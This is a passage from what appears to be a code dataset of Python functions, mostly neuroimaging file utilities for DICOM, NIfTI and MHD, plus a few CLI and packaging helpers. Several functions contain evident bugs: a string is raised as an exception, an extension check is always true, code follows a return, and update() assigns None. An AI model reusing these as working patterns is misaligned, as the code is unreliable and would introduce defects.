            "def _load_images_and_labels(self, images, labels=None):\n        \"\"\"Read the images, load them into self.items and set the labels.\"\"\"\n        if not isinstance(images, (list, tuple)):\n            raise ValueError('Expected an iterable (list or tuple) of strings or img-like objects. '\n                             'Got a {}.'.format(type(images)))\n\n        if not len(images) > 0:\n            raise ValueError('Expected an iterable (list or tuple) of strings or img-like objects '\n                             'of size higher than 0. Got {} items.'.format(len(images)))\n\n        if labels is not None and len(labels) != len(images):\n            raise ValueError('Expected the same length for image set ({}) and '\n                             'labels list ({}).'.format(len(images), len(labels)))\n\n        first_file = images[0]\n        if first_file:\n            first_img = NeuroImage(first_file)\n        else:\n            raise('Error reading image {}.'.format(repr_imgs(first_file)))\n\n        for idx, image in enumerate(images):\n            try:\n                img = NeuroImage(image)\n                self.check_compatibility(img, first_img)\n            except:\n                log.exception('Error reading image {}.'.format(repr_imgs(image)))\n                raise\n            else:\n                self.items.append(img)\n\n        self.set_labels(labels)"
        ],
        [
            "def to_file(self, output_file, smooth_fwhm=0, outdtype=None):\n        \"\"\"Save the Numpy array created from to_matrix function to the output_file.\n\n        Will save into the file: outmat, mask_indices, vol_shape and self.others (put here whatever you want)\n\n            data: Numpy array with shape N x prod(vol.shape)\n                  containing the N files as flat vectors.\n\n            mask_indices: matrix with indices of the voxels in the mask\n\n            vol_shape: Tuple with shape of the volumes, for reshaping.\n\n        Parameters\n        ----------\n        output_file: str\n            Path to the output file. The extension of the file will be taken into account for the file format.\n            Choices of extensions: '.pyshelf' or '.shelf' (Python shelve)\n                                   '.mat' (Matlab archive),\n                                   '.hdf5' or '.h5' (HDF5 file)\n\n        smooth_fwhm: int\n            Integer indicating the size of the FWHM Gaussian smoothing kernel\n            to smooth the subject volumes before creating the data matrix\n\n        outdtype: dtype\n            Type of the elements of the array, if None will obtain the dtype from\n            the first nifti file.\n        \"\"\"\n        outmat, mask_indices, mask_shape = self.to_matrix(smooth_fwhm, outdtype)\n\n        exporter = ExportData()\n        content = {'data':         outmat,\n                   'labels':       self.labels,\n                   'mask_indices': mask_indices,\n                   'mask_shape':   mask_shape, }\n\n        if self.others:\n            content.update(self.others)\n\n        log.debug('Creating content in file {}.'.format(output_file))\n        try:\n            exporter.save_variables(output_file, content)\n        except Exception as exc:\n            raise Exception('Error saving variables to file {}.'.format(output_file)) from exc"
        ],
        [
            "def die(msg, code=-1):\n    \"\"\"Writes msg to stderr and exits with return code\"\"\"\n    sys.stderr.write(msg + \"\\n\")\n    sys.exit(code)"
        ],
        [
            "def check_call(cmd_args):\n    \"\"\"\n    Calls the command\n\n    Parameters\n    ----------\n    cmd_args: list of str\n        Command name to call and its arguments in a list.\n\n    Returns\n    -------\n    Command output\n    \"\"\"\n    p = subprocess.Popen(cmd_args, stdout=subprocess.PIPE)\n    (output, err) = p.communicate()\n    return output"
        ],
        [
            "def call_command(cmd_name, args_strings):\n    \"\"\"Call CLI command with arguments and returns its return value.\n\n    Parameters\n    ----------\n    cmd_name: str\n        Command name or full path to the binary file.\n\n    arg_strings: list of str\n        Argument strings list.\n\n    Returns\n    -------\n    return_value\n        Command return value.\n    \"\"\"\n    if not op.isabs(cmd_name):\n        cmd_fullpath = which(cmd_name)\n    else:\n        cmd_fullpath = cmd_name\n\n    try:\n        cmd_line = [cmd_fullpath] + args_strings\n\n        log.info('Calling: {}.'.format(cmd_line))\n        retval = subprocess.check_call(cmd_line)\n    except CalledProcessError as ce:\n        log.exception(\"Error calling command {} with arguments: \"\n                      \"{} \\n With return code: {}\".format(cmd_name, args_strings,\n                                                          ce.returncode))\n        raise\n    else:\n        return retval"
        ],
        [
            "def condor_call(cmd, shell=True):\n    \"\"\"\n    Tries to submit cmd to HTCondor, if it does not succeed, it will\n    be called with subprocess.call.\n\n    Parameters\n    ----------\n    cmd: string\n        Command to be submitted\n\n    Returns\n    -------\n    \"\"\"\n    log.info(cmd)\n    ret = condor_submit(cmd)\n    if ret != 0:\n        subprocess.call(cmd, shell=shell)"
        ],
        [
            "def condor_submit(cmd):\n    \"\"\"\n    Submits cmd to HTCondor queue\n\n    Parameters\n    ----------\n    cmd: string\n        Command to be submitted\n\n    Returns\n    -------\n    int\n        returncode value from calling the submission command.\n    \"\"\"\n    is_running = subprocess.call('condor_status', shell=True) == 0\n    if not is_running:\n        raise CalledProcessError('HTCondor is not running.')\n\n    sub_cmd = 'condor_qsub -shell n -b y -r y -N ' \\\n              + cmd.split()[0] + ' -m n'\n\n    log.info('Calling: ' + sub_cmd)\n\n    return subprocess.call(sub_cmd + ' ' + cmd, shell=True)"
        ],
        [
            "def clean(ctx):\n    \"\"\"Clean previously built package artifacts.\n    \"\"\"\n    ctx.run(f'python setup.py clean')\n    dist = ROOT.joinpath('dist')\n    print(f'removing {dist}')\n    shutil.rmtree(str(dist))"
        ],
        [
            "def upload(ctx, repo):\n    \"\"\"Upload the package to an index server.\n\n    This implies cleaning and re-building the package.\n\n    :param repo: Required. Name of the index server to upload to, as specifies\n        in your .pypirc configuration file.\n    \"\"\"\n    artifacts = ' '.join(\n        shlex.quote(str(n))\n        for n in ROOT.joinpath('dist').glob('pipfile[-_]cli-*')\n    )\n    ctx.run(f'twine upload --repository=\"{repo}\" {artifacts}')"
        ],
        [
            "def load_command_table(self, args): #pylint: disable=too-many-statements\n        \"\"\"Load all Service Fabric commands\"\"\"\n\n        # Need an empty client for the select and upload operations\n        with CommandSuperGroup(__name__, self,\n                               'rcctl.custom_cluster#{}') as super_group:\n            with super_group.group('cluster') as group:\n                group.command('select', 'select')\n\n        with CommandSuperGroup(__name__, self, 'rcctl.custom_reliablecollections#{}',\n                               client_factory=client_create) as super_group: \n            with super_group.group('dictionary') as group:\n                group.command('query', 'query_reliabledictionary')\n                group.command('execute', 'execute_reliabledictionary')\n                group.command('schema', 'get_reliabledictionary_schema')\n                group.command('list', 'get_reliabledictionary_list')\n                group.command('type-schema', 'get_reliabledictionary_type_schema')\n\n        with ArgumentsContext(self, 'dictionary') as ac:\n            ac.argument('application_name', options_list=['--application-name', '-a'])\n            ac.argument('service_name', options_list=['--service-name', '-s'])\n            ac.argument('dictionary_name', options_list=['--dictionary-name', '-d'])\n            ac.argument('output_file', options_list=['--output-file', '-out'])\n            ac.argument('input_file', options_list=['--input-file', '-in'])\n            ac.argument('query_string', options_list=['--query-string', '-q'])\n            ac.argument('type_name', options_list=['--type-name', '-t'])\n        \n        return OrderedDict(self.command_table)"
        ],
        [
            "def open_volume_file(filepath):\n    \"\"\"Open a volumetric file using the tools following the file extension.\n\n    Parameters\n    ----------\n    filepath: str\n        Path to a volume file\n\n    Returns\n    -------\n    volume_data: np.ndarray\n        Volume data\n\n    pixdim: 1xN np.ndarray\n        Vector with the description of the voxels physical size (usually in mm) for each volume dimension.\n\n    Raises\n    ------\n    IOError\n        In case the file is not found.\n    \"\"\"\n    # check if the file exists\n    if not op.exists(filepath):\n        raise IOError('Could not find file {}.'.format(filepath))\n\n    # define helper functions\n    def open_nifti_file(filepath):\n        return NiftiImage(filepath)\n\n    def open_mhd_file(filepath):\n        return MedicalImage(filepath)\n        vol_data, hdr_data = load_raw_data_with_mhd(filepath)\n        # TODO: convert vol_data and hdr_data into MedicalImage\n        return vol_data, hdr_data\n\n    def open_mha_file(filepath):\n        raise NotImplementedError('This function has not been implemented yet.')\n\n    # generic loader function\n    def _load_file(filepath, loader):\n        return loader(filepath)\n\n    # file_extension -> file loader function\n    filext_loader = {\n                    'nii': open_nifti_file,\n                    'mhd': open_mhd_file,\n                    'mha': open_mha_file,\n                    }\n\n    # get extension of the `filepath`\n    ext = get_extension(filepath)\n\n    # find the loader from `ext`\n    loader = None\n    for e in filext_loader:\n        if ext in e:\n            loader = filext_loader[e]\n\n    if loader is None:\n        raise ValueError('Could not find a loader for file {}.'.format(filepath))\n\n    return _load_file(filepath, loader)"
        ],
        [
            "def rename_file_group_to_serial_nums(file_lst):\n    \"\"\"Will rename all files in file_lst to a padded serial\n    number plus its extension\n\n    :param file_lst: list of path.py paths\n    \"\"\"\n    file_lst.sort()\n    c = 1\n    for f in file_lst:\n        dirname = get_abspath(f.dirname())\n        fdest = f.joinpath(dirname, \"{0:04d}\".format(c) +\n                           OUTPUT_DICOM_EXTENSION)\n        log.info('Renaming {0} to {1}'.format(f, fdest))\n        f.rename(fdest)\n        c += 1"
        ],
        [
            "def _store_dicom_paths(self, folders):\n        \"\"\"Search for dicoms in folders and save file paths into\n        self.dicom_paths set.\n\n        :param folders: str or list of str\n        \"\"\"\n        if isinstance(folders, str):\n            folders = [folders]\n\n        for folder in folders:\n\n            if not os.path.exists(folder):\n                raise FolderNotFound(folder)\n\n            self.items.extend(list(find_all_dicom_files(folder)))"
        ],
        [
            "def from_set(self, fileset, check_if_dicoms=True):\n        \"\"\"Overwrites self.items with the given set of files.\n        Will filter the fileset and keep only Dicom files.\n\n        Parameters\n        ----------\n        fileset: iterable of str\n        Paths to files\n\n        check_if_dicoms: bool\n        Whether to check if the items in fileset are dicom file paths\n        \"\"\"\n        if check_if_dicoms:\n            self.items = []\n            for f in fileset:\n                if is_dicom_file(f):\n                    self.items.append(f)\n        else:\n            self.items = fileset"
        ],
        [
            "def update(self, dicomset):\n        \"\"\"Update this set with the union of itself and dicomset.\n\n        Parameters\n        ----------\n        dicomset: DicomFileSet\n        \"\"\"\n        if not isinstance(dicomset, DicomFileSet):\n            raise ValueError('Given dicomset is not a DicomFileSet.')\n\n        self.items = list(set(self.items).update(dicomset))"
        ],
        [
            "def copy_files_to_other_folder(self, output_folder, rename_files=True,\n                                   mkdir=True, verbose=False):\n        \"\"\"\n        Copies all files within this set to the output_folder\n\n        Parameters\n        ----------\n        output_folder: str\n        Path of the destination folder of the files\n\n        rename_files: bool\n        Whether or not rename the files to a sequential format\n\n        mkdir: bool\n        Whether to make the folder if it does not exist\n\n        verbose: bool\n        Whether to print to stdout the files that are beind copied\n        \"\"\"\n        import shutil\n\n        if not os.path.exists(output_folder):\n            os.mkdir(output_folder)\n\n        if not rename_files:\n            for dcmf in self.items:\n                outf = os.path.join(output_folder, os.path.basename(dcmf))\n                if verbose:\n                    print('{} -> {}'.format(dcmf, outf))\n                shutil.copyfile(dcmf, outf)\n        else:\n            n_pad = len(self.items)+2\n            for idx, dcmf in enumerate(self.items):\n                outf = '{number:0{width}d}.dcm'.format(width=n_pad, number=idx)\n                outf = os.path.join(output_folder, outf)\n                if verbose:\n                    print('{} -> {}'.format(dcmf, outf))\n                shutil.copyfile(dcmf, outf)"
        ],
        [
            "def get_dcm_reader(store_metadata=True, header_fields=None):\n        \"\"\"\n        Creates a lambda function to read DICOM files.\n        If store_store_metadata is False, will only return the file path.\n        Else if you give header_fields, will return only the set of of\n        header_fields within a DicomFile object or the whole DICOM file if\n        None.\n\n        :return: function\n        This function has only one parameter: file_path\n        \"\"\"\n        if not store_metadata:\n            return lambda fpath: fpath\n\n        if header_fields is None:\n            build_dcm = lambda fpath: DicomFile(fpath)\n        else:\n            dicom_header = namedtuple('DicomHeader', header_fields)\n            build_dcm = lambda fpath: dicom_header._make(DicomFile(fpath).get_attributes(header_fields))\n\n        return build_dcm"
        ],
        [
            "def scrape_all_files(self):\n        \"\"\"\n        Generator that yields one by one the return value for self.read_dcm\n        for each file within this set\n        \"\"\"\n        try:\n            for dcmf in self.items:\n                yield self.read_dcm(dcmf)\n        except IOError as ioe:\n            raise IOError('Error reading DICOM file: {}.'.format(dcmf)) from ioe"
        ],
        [
            "def get_unique_field_values(dcm_file_list, field_name):\n    \"\"\"Return a set of unique field values from a list of DICOM files\n\n    Parameters\n    ----------\n    dcm_file_list: iterable of DICOM file paths\n\n    field_name: str\n     Name of the field from where to get each value\n\n    Returns\n    -------\n    Set of field values\n    \"\"\"\n    field_values = set()\n\n    for dcm in dcm_file_list:\n        field_values.add(str(DicomFile(dcm).get_attributes(field_name)))\n\n    return field_values"
        ],
        [
            "def find_all_dicom_files(root_path):\n    \"\"\"\n    Returns a list of the dicom files within root_path\n\n    Parameters\n    ----------\n    root_path: str\n    Path to the directory to be recursively searched for DICOM files.\n\n    Returns\n    -------\n    dicoms: set\n    Set of DICOM absolute file paths\n    \"\"\"\n    dicoms = set()\n\n    try:\n        for fpath in get_all_files(root_path):\n            if is_dicom_file(fpath):\n                dicoms.add(fpath)\n    except IOError as ioe:\n        raise IOError('Error reading file {0}.'.format(fpath)) from ioe\n\n    return dicoms"
        ],
        [
            "def is_dicom_file(filepath):\n    \"\"\"\n    Tries to read the file using dicom.read_file,\n    if the file exists and dicom.read_file does not raise\n    and Exception returns True. False otherwise.\n\n    :param filepath: str\n     Path to DICOM file\n\n    :return: bool\n    \"\"\"\n    if not os.path.exists(filepath):\n        raise IOError('File {} not found.'.format(filepath))\n\n    filename = os.path.basename(filepath)\n    if filename == 'DICOMDIR':\n        return False\n\n    try:\n        _ = dicom.read_file(filepath)\n    except Exception as exc:\n        log.debug('Checking if {0} was a DICOM, but returned '\n                  'False.'.format(filepath))\n        return False\n\n    return True"
        ],
        [
            "def group_dicom_files(dicom_paths, hdr_field='PatientID'):\n    \"\"\"Group in a dictionary all the DICOM files in dicom_paths\n    separated by the given `hdr_field` tag value.\n\n    Parameters\n    ----------\n    dicom_paths: str\n        Iterable of DICOM file paths.\n\n    hdr_field: str\n        Name of the DICOM tag whose values will be used as key for the group.\n\n    Returns\n    -------\n    dicom_groups: dict of dicom_paths\n    \"\"\"\n    dicom_groups = defaultdict(list)\n    try:\n        for dcm in dicom_paths:\n            hdr = dicom.read_file(dcm)\n            group_key = getattr(hdr, hdr_field)\n            dicom_groups[group_key].append(dcm)\n    except KeyError as ke:\n        raise KeyError('Error reading field {} from file {}.'.format(hdr_field, dcm)) from ke\n\n    return dicom_groups"
        ],
        [
            "def get_attributes(self, attributes, default=''):\n        \"\"\"Return the attributes values from this DicomFile\n\n        Parameters\n        ----------\n        attributes: str or list of str\n         DICOM field names\n\n        default: str\n         Default value if the attribute does not exist.\n\n        Returns\n        -------\n        Value of the field or list of values.\n        \"\"\"\n        if isinstance(attributes, str):\n            attributes = [attributes]\n\n        attrs = [getattr(self, attr, default) for attr in attributes]\n\n        if len(attrs) == 1:\n            return attrs[0]\n\n        return tuple(attrs)"
        ],
        [
            "def merge_images(images, axis='t'):\n    \"\"\" Concatenate `images` in the direction determined in `axis`.\n\n    Parameters\n    ----------\n    images: list of str or img-like object.\n        See NeuroImage constructor docstring.\n\n    axis: str\n      't' : concatenate images in time\n      'x' : concatenate images in the x direction\n      'y' : concatenate images in the y direction\n      'z' : concatenate images in the z direction\n\n    Returns\n    -------\n    merged: img-like object\n    \"\"\"\n    # check if images is not empty\n    if not images:\n        return None\n\n    # the given axis name to axis idx\n    axis_dim = {'x': 0,\n                'y': 1,\n                'z': 2,\n                't': 3,\n                }\n\n    # check if the given axis name is valid\n    if axis not in axis_dim:\n        raise ValueError('Expected `axis` to be one of ({}), got {}.'.format(set(axis_dim.keys()), axis))\n\n    # check if all images are compatible with each other\n    img1 = images[0]\n    for img in images:\n        check_img_compatibility(img1, img)\n\n    # read the data of all the given images\n    # TODO: optimize memory consumption by merging one by one.\n    image_data = []\n    for img in images:\n        image_data.append(check_img(img).get_data())\n\n    # if the work_axis is bigger than the number of axis of the images,\n    # create a new axis for the images\n    work_axis = axis_dim[axis]\n    ndim = image_data[0].ndim\n    if ndim - 1 < work_axis:\n        image_data = [np.expand_dims(img, axis=work_axis) for img in image_data]\n\n    # concatenate and return\n    return np.concatenate(image_data, axis=work_axis)"
        ],
        [
            "def nifti_out(f):\n    \"\"\" Picks a function whose first argument is an `img`, processes its\n    data and returns a numpy array. This decorator wraps this numpy array\n    into a nibabel.Nifti1Image.\"\"\"\n    @wraps(f)\n    def wrapped(*args, **kwargs):\n        r = f(*args, **kwargs)\n\n        img = read_img(args[0])\n        return nib.Nifti1Image(r, affine=img.get_affine(), header=img.header)\n\n    return wrapped"
        ],
        [
            "def div_img(img1, div2):\n    \"\"\" Pixelwise division or divide by a number \"\"\"\n    if is_img(div2):\n        return img1.get_data()/div2.get_data()\n    elif isinstance(div2, (float, int)):\n        return img1.get_data()/div2\n    else:\n        raise NotImplementedError('Cannot divide {}({}) by '\n                                  '{}({})'.format(type(img1),\n                                                  img1,\n                                                  type(div2),\n                                                  div2))"
        ],
        [
            "def apply_mask(img, mask):\n    \"\"\"Return the image with the given `mask` applied.\"\"\"\n    from .mask import apply_mask\n\n    vol, _ = apply_mask(img, mask)\n    return vector_to_volume(vol, read_img(mask).get_data().astype(bool))"
        ],
        [
            "def abs_img(img):\n    \"\"\" Return an image with the binarised version of the data of `img`.\"\"\"\n    bool_img = np.abs(read_img(img).get_data())\n    return bool_img.astype(int)"
        ],
        [
            "def icc_img_to_zscore(icc, center_image=False):\n    \"\"\" Return a z-scored version of `icc`.\n    This function is based on GIFT `icatb_convertImageToZScores` function.\n    \"\"\"\n    vol = read_img(icc).get_data()\n\n    v2 = vol[vol != 0]\n    if center_image:\n        v2 = detrend(v2, axis=0)\n\n    vstd = np.linalg.norm(v2, ord=2) / np.sqrt(np.prod(v2.shape) - 1)\n\n    eps = np.finfo(vstd.dtype).eps\n    vol /= (eps + vstd)\n\n    return vol"
        ],
        [
            "def spatial_map(icc, thr, mode='+'):\n    \"\"\" Return the thresholded z-scored `icc`. \"\"\"\n    return thr_img(icc_img_to_zscore(icc), thr=thr, mode=mode).get_data()"
        ],
        [
            "def write_meta_header(filename, meta_dict):\n    \"\"\" Write the content of the `meta_dict` into `filename`.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file\n\n    meta_dict: dict\n        Dictionary with the fields of the metadata .mhd file\n    \"\"\"\n    header = ''\n    # do not use tags = meta_dict.keys() because the order of tags matters\n    for tag in MHD_TAGS:\n        if tag in meta_dict.keys():\n            header += '{} = {}\\n'.format(tag, meta_dict[tag])\n\n    with open(filename, 'w') as f:\n        f.write(header)"
        ],
        [
            "def dump_raw_data(filename, data):\n    \"\"\" Write the data into a raw format file. Big endian is always used.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file\n\n    data: numpy.ndarray\n        n-dimensional image data array.\n    \"\"\"\n    if data.ndim == 3:\n        # Begin 3D fix\n        data = data.reshape([data.shape[0], data.shape[1]*data.shape[2]])\n        # End 3D fix\n\n    a = array.array('f')\n    for o in data:\n        a.fromlist(list(o.flatten()))\n\n    # if is_little_endian():\n    #     a.byteswap()\n\n    with open(filename, 'wb') as rawf:\n        a.tofile(rawf)"
        ],
        [
            "def write_mhd_file(filename, data, shape=None, meta_dict=None):\n    \"\"\" Write the `data` and `meta_dict` in two files with names\n    that use `filename` as a prefix.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file.\n        This is going to be used as a preffix.\n        Two files will be created, one with a '.mhd' extension\n        and another with '.raw'. If `filename` has any of these already\n        they will be taken into account to build the filenames.\n\n    data: numpy.ndarray\n        n-dimensional image data array.\n\n    shape: tuple\n        Tuple describing the shape of `data`\n        Default: data.shape\n\n    meta_dict: dict\n        Dictionary with the fields of the metadata .mhd file\n        Default: {}\n\n    Returns\n    -------\n    mhd_filename: str\n        Path to the .mhd file\n\n    raw_filename: str\n        Path to the .raw file\n    \"\"\"\n    # check its extension\n    ext = get_extension(filename)\n    fname = op.basename(filename)\n    if ext != '.mhd' or ext != '.raw':\n        mhd_filename = fname + '.mhd'\n        raw_filename = fname + '.raw'\n    elif ext == '.mhd':\n        mhd_filename = fname\n        raw_filename = remove_ext(fname) + '.raw'\n    elif ext == '.raw':\n        mhd_filename = remove_ext(fname) + '.mhd'\n        raw_filename = fname\n    else:\n        raise ValueError('`filename` extension {} from {} is not recognised. '\n                         'Expected .mhd or .raw.'.format(ext, filename))\n\n    # default values\n    if meta_dict is None:\n        meta_dict = {}\n\n    if shape is None:\n        shape = data.shape\n\n    # prepare the default header\n    meta_dict['ObjectType']             = meta_dict.get('ObjectType',             'Image')\n    meta_dict['BinaryData']             = meta_dict.get('BinaryData',             'True' )\n    meta_dict['BinaryDataByteOrderMSB'] = meta_dict.get('BinaryDataByteOrderMSB', 'False')\n    meta_dict['ElementType']            = meta_dict.get('ElementType',            NUMPY_TO_MHD_TYPE[data.dtype.type])\n    meta_dict['NDims']                  = meta_dict.get('NDims',                  str(len(shape)))\n    meta_dict['DimSize']                = meta_dict.get('DimSize',                ' '.join([str(i) for i in shape]))\n    meta_dict['ElementDataFile']        = meta_dict.get('ElementDataFile',        raw_filename)\n\n    # target files\n    mhd_filename = op.join(op.dirname(filename), mhd_filename)\n    raw_filename = op.join(op.dirname(filename), raw_filename)\n\n    # write the header\n    write_meta_header(mhd_filename, meta_dict)\n\n    # write the data\n    dump_raw_data(raw_filename, data)\n\n    return mhd_filename, raw_filename"
        ],
        [
            "def copy_mhd_and_raw(src, dst):\n    \"\"\"Copy .mhd and .raw files to dst.\n\n    If dst is a folder, won't change the file, but if dst is another filepath,\n    will modify the ElementDataFile field in the .mhd to point to the\n    new renamed .raw file.\n\n    Parameters\n    ----------\n    src: str\n        Path to the .mhd file to be copied\n\n    dst: str\n        Path to the destination of the .mhd and .raw files.\n        If a new file name is given, the extension will be ignored.\n\n    Returns\n    -------\n    dst: str\n    \"\"\"\n    # check if src exists\n    if not op.exists(src):\n        raise IOError('Could not find file {}.'.format(src))\n\n    # check its extension\n    ext = get_extension(src)\n    if ext != '.mhd':\n        msg = 'The src file path must be a .mhd file. Given: {}.'.format(src)\n        raise ValueError(msg)\n\n    # get the raw file for this src mhd file\n    meta_src = _read_meta_header(src)\n\n    # get the source raw file\n    src_raw = meta_src['ElementDataFile']\n    if not op.isabs(src_raw):\n        src_raw = op.join(op.dirname(src), src_raw)\n\n    # check if dst is dir\n    if op.isdir(dst):\n        # copy the mhd and raw file to its destiny\n        shutil.copyfile(src, dst)\n        shutil.copyfile(src_raw, dst)\n        return dst\n\n    # build raw file dst file name\n    dst_raw = op.join(op.dirname(dst), remove_ext(op.basename(dst))) + '.raw'\n\n    # add extension to the dst path\n    if get_extension(dst) != '.mhd':\n        dst += '.mhd'\n\n    # copy the mhd and raw file to its destiny\n    log.debug('cp: {} -> {}'.format(src,     dst))\n    log.debug('cp: {} -> {}'.format(src_raw, dst_raw))\n    shutil.copyfile(src, dst)\n    shutil.copyfile(src_raw, dst_raw)\n\n    # check if src file name is different than dst file name\n    # if not the same file name, change the content of the ElementDataFile field\n    if op.basename(dst) != op.basename(src):\n        log.debug('modify {}: ElementDataFile: {} -> {}'.format(dst, src_raw,\n                                                                op.basename(dst_raw)))\n        meta_dst = _read_meta_header(dst)\n        meta_dst['ElementDataFile'] = op.basename(dst_raw)\n        write_meta_header(dst, meta_dst)\n\n    return dst"
        ],
        [
            "def sav_to_pandas_rpy2(input_file):\n    \"\"\"\n    SPSS .sav files to Pandas DataFrame through Rpy2\n\n    :param input_file: string\n\n    :return:\n    \"\"\"\n    import pandas.rpy.common as com\n\n    w = com.robj.r('foreign::read.spss(\"%s\", to.data.frame=TRUE)' % input_file)\n    return com.convert_robj(w)"
        ],
        [
            "def sav_to_pandas_savreader(input_file):\n    \"\"\"\n    SPSS .sav files to Pandas DataFrame through savreader module\n\n    :param input_file: string\n\n    :return:\n    \"\"\"\n    from savReaderWriter import SavReader\n    lines = []\n    with SavReader(input_file, returnHeader=True) as reader:\n        header = next(reader)\n        for line in reader:\n            lines.append(line)\n\n    return pd.DataFrame(data=lines, columns=header)"
        ],
        [
            "def save_varlist(filename, varnames, varlist):\n        \"\"\"\n        Valid extensions '.pyshelf', '.mat', '.hdf5' or '.h5'\n\n        @param filename: string\n\n        @param varnames: list of strings\n        Names of the variables\n\n        @param varlist: list of objects\n        The objects to be saved\n        \"\"\"\n        variables = {}\n        for i, vn in enumerate(varnames):\n            variables[vn] = varlist[i]\n\n        ExportData.save_variables(filename, variables)"
        ],
        [
            "def cli():\n    \"\"\"Create CLI environment\"\"\"\n    return VersionedCLI(cli_name=SF_CLI_NAME,\n                        config_dir=SF_CLI_CONFIG_DIR,\n                        config_env_var_prefix=SF_CLI_ENV_VAR_PREFIX,\n                        commands_loader_cls=SFCommandLoader,\n                        help_cls=SFCommandHelp)"
        ],
        [
            "def drain_rois(img):\n    \"\"\"Find all the ROIs in img and returns a similar volume with the ROIs\n    emptied, keeping only their border voxels.\n\n    This is useful for DTI tractography.\n\n    Parameters\n    ----------\n    img: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    np.ndarray\n        an array of same shape as img_data\n    \"\"\"\n    img_data = get_img_data(img)\n\n    out = np.zeros(img_data.shape, dtype=img_data.dtype)\n\n    krn_dim = [3] * img_data.ndim\n    kernel  = np.ones(krn_dim, dtype=int)\n\n    vals = np.unique(img_data)\n    vals = vals[vals != 0]\n\n    for i in vals:\n        roi  = img_data == i\n        hits = scn.binary_hit_or_miss(roi, kernel)\n        roi[hits] = 0\n        out[roi > 0] = i\n\n    return out"
        ],
        [
            "def largest_connected_component(volume):\n    \"\"\"Return the largest connected component of a 3D array.\n\n    Parameters\n    -----------\n    volume: numpy.array\n        3D boolean array.\n\n    Returns\n    --------\n    volume: numpy.array\n        3D boolean array with only one connected component.\n    \"\"\"\n    # We use asarray to be able to work with masked arrays.\n    volume = np.asarray(volume)\n    labels, num_labels = scn.label(volume)\n    if not num_labels:\n        raise ValueError('No non-zero values: no connected components found.')\n\n    if num_labels == 1:\n        return volume.astype(np.bool)\n\n    label_count = np.bincount(labels.ravel().astype(np.int))\n    # discard the 0 label\n    label_count[0] = 0\n    return labels == label_count.argmax()"
        ],
        [
            "def large_clusters_mask(volume, min_cluster_size):\n    \"\"\" Return as mask for `volume` that includes only areas where\n    the connected components have a size bigger than `min_cluster_size`\n    in number of voxels.\n\n    Parameters\n    -----------\n    volume: numpy.array\n        3D boolean array.\n\n    min_cluster_size: int\n        Minimum size in voxels that the connected component must have.\n\n    Returns\n    --------\n    volume: numpy.array\n        3D int array with a mask excluding small connected components.\n    \"\"\"\n    labels, num_labels = scn.label(volume)\n\n    labels_to_keep = set([i for i in range(num_labels)\n                         if np.sum(labels == i) >= min_cluster_size])\n\n    clusters_mask = np.zeros_like(volume, dtype=int)\n    for l in range(num_labels):\n        if l in labels_to_keep:\n            clusters_mask[labels == l] = 1\n\n    return clusters_mask"
        ],
        [
            "def create_rois_mask(roislist, filelist):\n    \"\"\"Look for the files in filelist containing the names in roislist, these files will be opened, binarised\n    and merged in one mask.\n\n    Parameters\n    ----------\n    roislist: list of strings\n        Names of the ROIs, which will have to be in the names of the files in filelist.\n\n    filelist: list of strings\n        List of paths to the volume files containing the ROIs.\n\n    Returns\n    -------\n    numpy.ndarray\n        Mask volume\n    \"\"\"\n    roifiles = []\n\n    for roi in roislist:\n        try:\n            roi_file = search_list(roi, filelist)[0]\n        except Exception as exc:\n            raise Exception('Error creating list of roi files. \\n {}'.format(str(exc)))\n        else:\n            roifiles.append(roi_file)\n\n    return binarise(roifiles)"
        ],
        [
            "def get_unique_nonzeros(arr):\n    \"\"\" Return a sorted list of the non-zero unique values of arr.\n\n    Parameters\n    ----------\n    arr: numpy.ndarray\n        The data array\n\n    Returns\n    -------\n    list of items of arr.\n    \"\"\"\n    rois = np.unique(arr)\n    rois = rois[np.nonzero(rois)]\n    rois.sort()\n\n    return rois"
        ],
        [
            "def get_rois_centers_of_mass(vol):\n    \"\"\"Get the center of mass for each ROI in the given volume.\n\n    Parameters\n    ----------\n    vol: numpy ndarray\n        Volume with different values for each ROI.\n\n    Returns\n    -------\n    OrderedDict\n        Each entry in the dict has the ROI value as key and the center_of_mass coordinate as value.\n    \"\"\"\n    from scipy.ndimage.measurements import center_of_mass\n\n    roisvals = np.unique(vol)\n    roisvals = roisvals[roisvals != 0]\n\n    rois_centers = OrderedDict()\n    for r in roisvals:\n        rois_centers[r] = center_of_mass(vol, vol, r)\n\n    return rois_centers"
        ],
        [
            "def _partition_data(datavol, roivol, roivalue, maskvol=None, zeroe=True):\n    \"\"\" Extracts the values in `datavol` that are in the ROI with value `roivalue` in `roivol`.\n    The ROI can be masked by `maskvol`.\n\n    Parameters\n    ----------\n    datavol: numpy.ndarray\n        4D timeseries volume or a 3D volume to be partitioned\n\n    roivol: numpy.ndarray\n        3D ROIs volume\n\n    roivalue: int or float\n        A value from roivol that represents the ROI to be used for extraction.\n\n    maskvol: numpy.ndarray\n        3D mask volume\n\n    zeroe: bool\n        If true will remove the null timeseries voxels.  Only applied to timeseries (4D) data.\n\n    Returns\n    -------\n    values: np.array\n        An array of the values in the indicated ROI.\n        A 2D matrix if `datavol` is 4D or a 1D vector if `datavol` is 3D.\n    \"\"\"\n    if maskvol is not None:\n        # get all masked time series within this roi r\n        indices = (roivol == roivalue) * (maskvol > 0)\n    else:\n        # get all time series within this roi r\n        indices = roivol == roivalue\n\n    if datavol.ndim == 4:\n        ts = datavol[indices, :]\n    else:\n        ts = datavol[indices]\n\n    # remove zeroed time series\n    if zeroe:\n        if datavol.ndim == 4:\n            ts = ts[ts.sum(axis=1) != 0, :]\n\n    return ts"
        ],
        [
